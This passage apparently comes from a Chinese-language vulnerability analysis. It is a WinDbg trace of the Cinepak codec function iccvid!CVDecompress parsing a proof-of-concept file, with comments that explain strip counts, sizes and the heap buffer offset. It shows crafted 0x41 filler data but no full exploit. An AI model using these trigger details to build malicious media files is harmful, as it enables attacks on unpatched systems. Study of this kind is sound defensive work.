class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x78</span>:</span><br><span class="line">73b72226 83c60a          <span class="keyword">add</span>     <span class="built_in">esi</span>,<span class="number">0Ah</span>                                        <span class="comment">; esi = 0x00ba6902,指向cinepak_codec_data2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">011</span>&gt; <span class="built_in">dd</span> 00ba6902 </span><br><span class="line">00ba6902  <span class="number">10000010</span> <span class="number">00000000</span> <span class="number">60016000</span> <span class="number">00000020</span></span><br><span class="line">00ba6912  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6922  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6932  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6942  <span class="number">10000011</span> <span class="number">64690041</span> <span class="number">00103178</span> <span class="number">30300000</span></span><br><span class="line">00ba6952  <span class="number">00106364</span> <span class="number">00040000</span> <span class="number">00680000</span> <span class="number">00000000</span></span><br><span class="line">00ba6962  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00ba6972  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72229 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x7b</span>:</span><br><span class="line">73b72229 897<span class="keyword">dec</span>          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>],<span class="built_in">edi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=0236f648  <span class="comment">; edi = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7222c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x7e</span>:</span><br><span class="line">73b7222c 8975e8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">esi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=<span class="number">00000120</span>  <span class="comment">; [ebp-18h] = esi = 0x00ba6902,指向cinepak_codec_data2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7222f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x81</span>:</span><br><span class="line">73b7222f 8975f4          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="built_in">esi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=<span class="number">00000004</span> <span class="comment">; [ebp-0Ch] = esi = 0x00ba6902,指向cinepak_codec_data2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72232 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x84</span>:</span><br><span class="line">73b72232 8a46ff          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>-<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6901=<span class="number">10</span>     <span class="comment">; al = 0x10,Number of coded strips的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; <span class="built_in">dd</span> 00ba6902 </span><br><span class="line">00ba6902  <span class="number">10000010</span> <span class="number">00000000</span> <span class="number">60016000</span> <span class="number">00000020</span></span><br><span class="line">00ba6912  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6922  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6932  <span class="number">10000011</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line">00ba6942  <span class="number">10000011</span> <span class="number">64690041</span> <span class="number">00103178</span> <span class="number">30300000</span></span><br><span class="line">00ba6952  <span class="number">00106364</span> <span class="number">00040000</span> <span class="number">00680000</span> <span class="number">00000000</span></span><br><span class="line">00ba6962  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00ba6972  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72235 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz ac po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000212</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x87</span>:</span><br><span class="line">73b72235 3bc7            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断Number of coded strips是否大于0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72237 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x89</span>:</span><br><span class="line">73b72237 8945e4          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd14=<span class="number">00000001</span> <span class="comment">; [ebp-1Ch] = eax = 0x10,Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7223a <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x8c</span>:</span><br><span class="line">73b7223a 0f8eaa010000    <span class="keyword">jle</span>     iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于等于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72240 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x92</span>:</span><br><span class="line">73b72240 897dfc          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="built_in">edi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00000150</span> <span class="comment">; 局部变量[ebp-4]赋值为0,堆缓冲区指针偏移</span></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72243 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x95</span>:</span><br><span class="line">73b72243 8b45f0          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000005e <span class="comment">; 未解压缩的数据长度，开始时等于PoC中cinepak_codec_data2和idx_tag字节数之和</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72246 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x98</span>:</span><br><span class="line">73b72246 83f816          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">16h</span>                                        <span class="comment">; 判断未解压的数据长度是否小于0x16,</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72249 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x9b</span>:</span><br><span class="line">73b72249 0f829b010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7224f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa1</span>:</span><br><span class="line">73b7224f 0fb65603        <span class="keyword">movzx</span>   <span class="built_in">edx</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6905=<span class="number">10</span> <span class="comment">; edx = 0x10,Size of strip data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72253 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa5</span>:</span><br><span class="line">73b72253 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72255 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa7</span>:</span><br><span class="line">73b72255 8a6e01          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6903=<span class="number">00</span> <span class="comment">; ch = 0x00,Strip CVID ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72258 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xaa</span>:</span><br><span class="line">73b72258 8a4e02          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6904=<span class="number">00</span> <span class="comment">; cl = 0x00,Size of strip data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xad</span>:</span><br><span class="line">73b7225b c1e108          <span class="keyword">shl</span>     <span class="built_in">ecx</span>,<span class="number">8</span>                                          <span class="comment">; ecx = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb0</span>:</span><br><span class="line">73b7225e 0bca            <span class="keyword">or</span>      <span class="built_in">ecx</span>,<span class="built_in">edx</span>                                        <span class="comment">; 以大端读取Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72260 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb2</span>:</span><br><span class="line">73b72260 3bc1            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                        <span class="comment">; 判断未解压缩的数据长度是否大于Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72262 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb4</span>:</span><br><span class="line">73b72262 894df8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000004</span> <span class="comment">; [ebp-8] = ecx = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72265 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb7</span>:</span><br><span class="line">73b72265 0f827f010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbd</span>:</span><br><span class="line">73b7226b 8a06            <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6902=<span class="number">10</span> <span class="comment">; al = 0x10,Strip CVID ID的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226d <span 